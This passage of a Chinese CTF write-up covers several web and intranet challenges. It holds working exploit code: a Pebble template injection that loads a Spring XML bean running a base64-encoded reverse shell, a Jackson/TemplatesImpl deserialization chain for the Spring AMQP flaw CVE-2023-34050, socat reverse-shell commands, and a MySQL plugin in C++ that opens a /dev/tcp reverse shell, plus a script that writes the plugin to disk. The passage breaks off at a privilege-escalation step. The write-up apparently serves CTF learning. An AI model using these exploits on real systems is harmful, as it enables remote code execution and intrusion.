  <span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory"</span><span class="token punctuation">)</span> <span class="token operator">||</span> context      <span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"jacksonObjectMapper"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>1.pebble</p><pre class="language-none"><code class="language-none">&#123;% set bypass1 &#x3D; &quot;org.springframework.boot.autoconfigure.&quot; %&#125;&#123;% set bypass2 &#x3D; &quot;internalCachingMetadataReaderFactory&quot; %&#125;&#123;% set bypass3 &#x3D; &quot;java.beans.&quot; %&#125;&#123;% set bypass4 &#x3D; &quot;Beans&quot; %&#125;&#123;% set bypass5 &#x3D; &quot;jackson&quot; %&#125;&#123;% set bypass6 &#x3D; &quot;ObjectMapper&quot; %&#125;&#123;% set bypass7 &#x3D; &quot;org.springframework.context.support.&quot; %&#125;&#123;% set bypass8 &#x3D; &quot;ClassPathXmlApplicationContext&quot; %&#125;&#123;% set y &#x3D; beans.get(bypass1+bypass2).resourceLoader.classLoader.loadClass(bypass3+bypass4) %&#125;&#123;% set yy &#x3D; beans.get(bypass5+bypass6).readValue(&quot;&#123;&#125;&quot;, y) %&#125;&#123;% set yyy &#x3D; yy.instantiate(null,bypass7+bypass8) %&#125;&#123;&#123; yyy.setConfigLocation(&quot;1.xml&quot;) &#125;&#125;&#123;&#123; yyy.refresh() &#125;&#125;</code></pre><p>1.xml</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pb<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>echo x|base64 -d|bash -i<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>                 <span class="token comment">&lt;!-- x: "bash -i >&amp; /dev/tcp/ip/port 0>&amp;1" encoded with base64 --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>通过 <code>/uploadFile</code> 路由上传 1.pebble，再通过 <code>/</code> 路由访问上传的 template 模板，远程加载 1.xml 实现 RCE，最后反弹 Shell 获得 flag</p><h1 id="Week3-ez-cfs"><a href="#Week3-ez-cfs" class="headerlink" title="Week3 - ez_cfs"></a>Week3 - ez_cfs</h1><h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p><img src="image-10.png" alt="image-10.png"></p><h2 id="1-ez-cfs-part1"><a href="#1-ez-cfs-part1" class="headerlink" title="1. ez_cfs_part1"></a>1. ez_cfs_part1</h2><blockquote><p>出题思路来自：<br><a href="https://exp10it.io/2023/10/spring-amqp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2023-34050-%E5%88%86%E6%9E%90/">https://exp10it.io/2023/10/spring-amqp-反序列化漏洞-cve-2023-34050-分析/</a></p></blockquote><p>CVE-2023-34050：Spring AMQP 反序列化漏洞</p><blockquote><p>根据 Spring 官方通告的描述, 满足以下条件时则存在漏洞</p><ul><li>使用 SimpleMessageConverter 或 SerializerMessageConverter (默认为 SimpleMessageConverter)</li><li>开发者没有配置 allowed list patterns</li><li>攻击者可以向 RabbitMQ 服务器的某个 Queue 内写入 Message (RabbitMQ 未授权&#x2F;弱口令&#x2F;可配置 RabbitMQ 连接参数)</li><li>必须得有对应的 Listener 来处理接收到的 Message (使用 @RabbitListener 或 @RabbitHandler 注解)</li></ul></blockquote><p>首先是爆破 RabbitMQ 服务器的弱口令，简单尝试后可以得出是 Test:654321<br>然后使用 Jackson 原生反序列化 + TemplatesImpl</p><h3 id="1-1-Jackson-原生反序列化链"><a href="#1-1-Jackson-原生反序列化链" class="headerlink" title="1.1 Jackson 原生反序列化链"></a>1.1 Jackson 原生反序列化链</h3><p>Gadgets.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Gadgets</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">TemplatesImpl</span> <span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"&#123;java.lang.Runtime.getRuntime().exec(\"%s\"); throw new org.springframework.amqp.AmqpRejectAndDontRequeueException(\"err\");&#125;"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 利用 Javaassist 动态创建 TemplatesImpl 恶意类</span>        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"TemplatesEvilClass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 设置 Super Class 为 AbstractTranslet</span>        <span class="token class-name">CtClass</span> superClazz <span class="token operator">=</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clazz<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClazz<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 创建无参 Constructor, 写入 Runtime.exec</span>        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>        clazz<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将 Runtime.exec 直接写入 static 代码块</span><span class="token comment">//        clazz.makeClassInitializer().setBody(body);</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> templatesImpl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getByteCode</span><span class="token punctuation">(</span><span class="token class-name">Class</span> clazz<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CtClass</span> c <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Reflections.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Reflections</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> val<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Field</span> f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">invokeMethod</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> parameterTypes<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> m <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> parameterTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>        m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>MessageController.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> sendPoc <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token class-name">Gadgets</span><span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">AdvisedSupport</span> as <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        as<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">AdvisedSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InvocationHandler</span> jdkDynamicAopProxyHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>as<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Templates</span> templatesProxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> jdkDynamicAopProxyHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">POJONode</span> pojoNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>templatesProxy<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> poc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>poc<span class="token punctuation">,</span> <span class="token string">"val"</span><span class="token punctuation">,</span> pojoNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        messageSenderService<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span></code></pre><h3 id="1-2-注意点："><a href="#1-2-注意点：" class="headerlink" title="1.2 注意点："></a>1.2 注意点：</h3><h4 id="1-2-1-删除-BaseJsonNode-writeReplace"><a href="#1-2-1-删除-BaseJsonNode-writeReplace" class="headerlink" title="1.2.1 删除 BaseJsonNode.writeReplace"></a>1.2.1 删除 BaseJsonNode.writeReplace</h4><p>使用原本的 BaseJsonNode 的话，在发送消息序列化的时候会调用 <code>BaseJsonNode.writeReplace()</code> ，最后也会调用 <code>TemplatesImpl.getOutputProperties()</code> 触发命令执行</p><p>但是这里触发后会报错 <code>NullPointerException</code> ，导致消息传递中断</p><p>删除掉 <code>BaseJsonNode.writeReplace()</code> 就调用的是 <code>UnmodifiableRandomAccessList.writeReplace()</code> ，消息能继续传递</p><h4 id="1-2-2-抛出-AmqpRejectAndDontRequeueException-异常"><a href="#1-2-2-抛出-AmqpRejectAndDontRequeueException-异常" class="headerlink" title="1.2.2 抛出 AmqpRejectAndDontRequeueException 异常"></a>1.2.2 抛出 AmqpRejectAndDontRequeueException 异常</h4><p>因为在执行 <code>Jackson</code> 链时必然会出现报错，导致消息处理不成功，就会让消息重新排队处理，然后又报错，陷入死循环。</p><p>抛出这个异常可以避免无限次地重试失败的消息，节约系统资源。</p><h4 id="1-2-3-消息未处理，删除队列"><a href="#1-2-3-消息未处理，删除队列" class="headerlink" title="1.2.3 消息未处理，删除队列"></a>1.2.3 消息未处理，删除队列</h4><p>由于消息处理失败，还是会留存在队中，处于 <code>unacked</code> 状态，当测试程序再次启动时，就会优先处理队列中留存消息。</p><p>所以在复现过程中如果队列中还留存有上一次测试的消息，可以把队列删除重新创建。 </p><h2 id="2-ez-cfs-part2"><a href="#2-ez-cfs-part2" class="headerlink" title="2. ez_cfs_part2"></a>2. ez_cfs_part2</h2><p>比较典型的内网横向渗透</p><h3 id="2-1-探查内网环境"><a href="#2-1-探查内网环境" class="headerlink" title="2.1 探查内网环境"></a>2.1 探查内网环境</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/hosts</code></pre><p>可以看出 server 处于两个内网 Network 中，使用 Nmap 对相应子段进行扫描，发现存在一台 MySQL 容器<br>如果直接在反弹的 Shell 上调用 mysql-client 是无法正常输入密码和连接的，<br>这是因为反弹的 Shell 一般没有分配 tty</p><h3 id="2-2-反弹-tty"><a href="#2-2-反弹-tty" class="headerlink" title="2.2 反弹 tty"></a>2.2 反弹 tty</h3><p>使用 socat 工具可以反弹 tty</p><p>socat_listen.sh</p><pre class="language-bash" data-language="bash"><code class="language-bash">socat file:<span class="token variable"><span class="token variable">`</span><span class="token function">tty</span><span class="token variable">`</span></span>,raw,echo<span class="token operator">=</span><span class="token number">0</span> tcp-listen:<span class="token operator">&lt;</span>listen_port<span class="token operator">></span></code></pre><p>socat_shell.sh</p><pre class="language-bash" data-language="bash"><code class="language-bash">socat tcp:<span class="token operator">&lt;</span>server<span class="token operator">></span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">></span> exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint,sane</code></pre><p>反弹 tty 后即可正常连接 MySQL</p><h3 id="2-3-连接-MySQL"><a href="#2-3-连接-MySQL" class="headerlink" title="2.3 连接 MySQL"></a>2.3 连接 MySQL</h3><pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-h</span> <span class="token operator">&lt;</span>mysql_server_ip<span class="token operator">></span> <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span></code></pre><p>简单尝试发现口令为 <code>root:root</code> ，<br>登录后即可在 ctf 数据库的 flag 表中获得 flag_2</p><blockquote><p>PS：由于靶机环境可以联网，本题也可以使用其他可用于连接 MySQL 且无需 tty 即可进行交互的工具完成</p></blockquote><h2 id="3-ez-cfs-part3"><a href="#3-ez-cfs-part3" class="headerlink" title="3. ez_cfs_part3"></a>3. ez_cfs_part3</h2><blockquote><p>原题是 2023 N1CTF lolita 出的 ez_maria<br>本题使用了 ProxySQL 替代了原题的 PHP preg_match 作为 waf ，其本质和解题过程还是一样的</p></blockquote><p>简单尝试后发现 mysql 过滤了一部分关键词，这里使用加载 shell 插件来反弹 shell</p><h3 id="3-1-恢复-skip-grant-tables"><a href="#3-1-恢复-skip-grant-tables" class="headerlink" title="3.1 恢复 skip-grant-tables"></a>3.1 恢复 skip-grant-tables</h3><p>恢复 mysql 的表，因为使用 skip-grant-tables 启动，缺失 mysql 表，无法使用插件</p><pre class="language-sql" data-language="sql"><code class="language-sql">mysql <span class="token operator">></span> <span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> mysql<span class="token punctuation">;</span>mysql <span class="token operator">></span> <span class="token keyword">use</span> mysql<span class="token punctuation">;</span>mysql <span class="token operator">></span> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> plugin <span class="token punctuation">(</span> name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span> dl <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span>Aria transactional<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8mb3 <span class="token keyword">COLLATE</span> utf8mb3_general_ci <span class="token keyword">comment</span><span class="token operator">=</span><span class="token string">'MySQL plugins'</span><span class="token punctuation">;</span></code></pre><h3 id="3-2-MySQL-Plugin-RCE"><a href="#3-2-MySQL-Plugin-RCE" class="headerlink" title="3.2 MySQL Plugin RCE"></a>3.2 MySQL Plugin RCE</h3><p>编写插件</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/ip/port 0>&amp;1 &amp;'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">LIN</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span><span class="token operator">:</span>        <span class="token function">LIN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>LIN lin<span class="token punctuation">;</span>LIN<span class="token operator">*</span> _mysql_plugin_interface_version_ <span class="token operator">=</span> <span class="token operator">&amp;</span>lin<span class="token punctuation">;</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">g++ lin.cpp <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-o</span> lin.so</code></pre><p>将编译出来的 so 文件用 dumpfile 写到 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; 目录</p><pre class="language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"lin.so"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>sql <span class="token operator">=</span> <span class="token string">"select unhex('"</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%02X'</span> <span class="token operator">%</span> b <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"') into dumpfile '/usr/lib/mysql/plugin/lin.so';"</span>f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload.sql"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>sql<span class="token punctuation">)</span></code></pre><p>将 payload.sql 上传至 client 端并运行</p><pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token operator">></span> <span class="token builtin class-name">source</span> payload.sql<span class="token punctuation">;</span></code></pre><p>最后安装插件反弹shell</p><pre class="language-bash" data-language="bash"><code class="language-bash">mysql <span class="token operator">></span> INSTALL PLUGIN plugin_name SONAME <span class="token string">'lin.so'</span></code></pre><h2 id="4-ez-cfs-part4"><a href="#4-ez-cfs-part4" class="headerlink" title="4. ez_cfs_part4"></a>4. ez_cfs_part4</h2><p>可以看到 <code>/flag_4</code> 没有权限读取，找 <code>suid</code> 和 <code>cap</code></p><pre class="language-bash" 